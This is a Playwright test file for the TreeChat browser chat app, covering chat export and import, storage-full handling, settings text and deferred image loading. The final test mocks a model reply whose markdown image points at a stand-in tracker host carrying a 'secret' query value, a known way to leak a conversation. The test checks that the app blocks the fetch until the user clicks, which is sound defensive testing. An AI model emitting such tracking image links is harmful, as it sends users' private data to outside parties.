import { readFile } from 'node:fs/promises'
import { blockOutsideTraffic, expect, test, type Page } from './fixtures'
import { afterSaves, savedLibrary } from './library'

async function sessionIds(page: Page): Promise<string[]> {
  return (await savedLibrary(page)).sessions.map((session) => session.id)
}

test.beforeEach(async ({ page }) => {
  await page.goto('/')
})

test('chats export to JSON and import into another browser', async ({ page, browser }, testInfo) => {
  await page.getByTestId('show-demo').click()
  await page.getByTestId('settings-button').click()
  const [download] = await Promise.all([page.waitForEvent('download'), page.getByTestId('settings-export').click()])
  expect(download.suggestedFilename()).toMatch(/^treechat-chats-\d{4}-\d{2}-\d{2}\.json$/)
  const file = JSON.parse(await readFile((await download.path())!, 'utf8'))
  expect(file).toMatchObject({ format: 'treechat-export', version: 1 })
  expect(file.sessions[0].title).toBe('What is TreeChat?')

  // A fresh browser: its blank chat gives way to the imported one.
  const context = await browser.newContext({ ...testInfo.project.use })
  await blockOutsideTraffic(context)
  const other = await context.newPage()
  await other.goto('/')
  await other.getByTestId('settings-button').click()
  await other.getByTestId('settings-import-input').setInputFiles({ name: 'chats.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(file)) })
  await expect(other.getByTestId('toast')).toContainText('Imported 1 chat')
  await expect(other.locator('[data-message-id="msg-root-4"]')).toBeAttached()
  await expect.poll(() => sessionIds(other)).toEqual([file.sessions[0].id])

  // The same file again changes nothing; a foreign file is refused.
  await other.getByTestId('settings-button').click()
  await other.getByTestId('settings-import-input').setInputFiles({ name: 'chats.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(file)) })
  await expect(other.getByTestId('toast')).toContainText('already here')
  await afterSaves(other)
  expect(await sessionIds(other)).toHaveLength(1)
  // Reopening mid close-animation can be swallowed; wait for it to finish.
  await expect(other.getByTestId('settings-dialog')).toBeHidden()
  await other.getByTestId('settings-button').click()
  await other.getByTestId('settings-import-input').setInputFiles({ name: 'x.json', mimeType: 'application/json', buffer: Buffer.from('{"hello":1}') })
  await expect(other.getByTestId('toast')).toContainText('not a TreeChat export')
  await context.close()
})

test('a full storage warns and keeps every chat instead of deleting old ones', async ({ page }) => {
  await page.getByTestId('show-demo').click()
  await expect.poll(async () => (await savedLibrary(page)).sessions[0]?.title).toBe('What is TreeChat?')
  const saved = await savedLibrary(page)
  // From now on the browser refuses to store the chat library.
  await page.evaluate(() => {
    const put = IDBObjectStore.prototype.put
    IDBObjectStore.prototype.put = function (...args: Parameters<IDBObjectStore['put']>) {
      if (this.name === 'library') throw new DOMException('Quota exceeded', 'QuotaExceededError')
      return put.apply(this, args)
    }
  })
  await page.getByTestId('thread-composer').fill('One more message')
  await page.getByTestId('thread-composer').press('Enter')
  const warning = page.getByTestId('storage-full')
  await expect(warning).toBeVisible()
  await expect(warning).toContainText('recent changes are not being saved')
  expect(await savedLibrary(page)).toEqual(saved)
  const [download] = await Promise.all([page.waitForEvent('download'), warning.getByRole('button', { name: 'Export chats' }).click()])
  // The export has what storage could not hold.
  expect(await readFile((await download.path())!, 'utf8')).toContain('One more message')
})

test('turning on web search with a key mentions its cost once', async ({ page }, testInfo) => {
  test.skip(Boolean(testInfo.project.use.isMobile), 'the same toast on phones')
  await page.evaluate(() => localStorage.setItem('treechat:provider:v1', JSON.stringify({ provider: 'openrouter', apiKey: 'test-only-never-sent', model: 'openai/gpt-4.1-mini' })))
  await page.reload()
  const globe = page.getByTestId('web-search-toggle')
  await expect(globe).toHaveAttribute('title', /small OpenRouter fee/)
  await globe.click()
  await expect(page.getByTestId('toast')).toContainText('each search adds a small fee')
  await page.getByTestId('toast').getByRole('button', { name: 'Got it' }).click()
  await globe.click()
  await globe.click()
  await expect(page.getByTestId('toast')).toHaveCount(0)
})

test('Settings says where data goes and links to bug reports', async ({ page }) => {
  await page.getByTestId('settings-button').click()
  await expect(page.getByTestId('settings-dialog')).toContainText('Use a key with a credit limit')
  await page.getByTestId('settings-privacy').locator('summary').click()
  await expect(page.getByTestId('settings-privacy')).toContainText('r.jina.ai')
  await expect(page.getByTestId('report-problem')).toHaveAttribute('href', 'https://github.com/akarshgopal/treechat/issues/new')
})

test('an image in a reply is not fetched until asked for', async ({ page }, testInfo) => {
  test.skip(Boolean(testInfo.project.use.isMobile), 'same rendering on phones')
  // A reply that would leak the conversation through an image URL if it loaded by itself.
  const fetched: string[] = []
  await page.route('https://tracker.example/**', (route) => {
    fetched.push(route.request().url())
    return route.fulfill({ status: 200, contentType: 'image/png', body: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') })
  })
  await page.route('https://openrouter.ai/api/v1/chat/completions', (route) => route.fulfill({
    status: 200,
    contentType: 'text/event-stream',
    body: 'data: {"choices":[{"delta":{"content":"Here is a chart: ![sales chart](https://tracker.example/pixel.png?q=secret) — done."}}]}\n\ndata: [DONE]\n\n',
  }))
  await page.evaluate(() => localStorage.setItem('treechat:provider:v1', JSON.stringify({ provider: 'openrouter', apiKey: 'test-only-never-sent', model: 'openai/gpt-5.6-luna' })))
  await page.reload()
  await page.getByTestId('thread-composer').fill('Show me a chart')
  await page.getByTestId('thread-composer').press('Enter')
  await expect(page.locator('article').last()).toContainText('done.')
  await page.waitForTimeout(500)
  expect(fetched).toEqual([])
  const placeholder = page.getByTestId('remote-image')
  await expect(placeholder).toContainText('sales chart')
  await expect(placeholder).toContainText('tracker.example')

  await placeholder.click()
  await expect(page.locator('article').last().locator('img')).toBeVisible()
  expect(fetched).toEqual(['https://tracker.example/pixel.png?q=secret'])
})
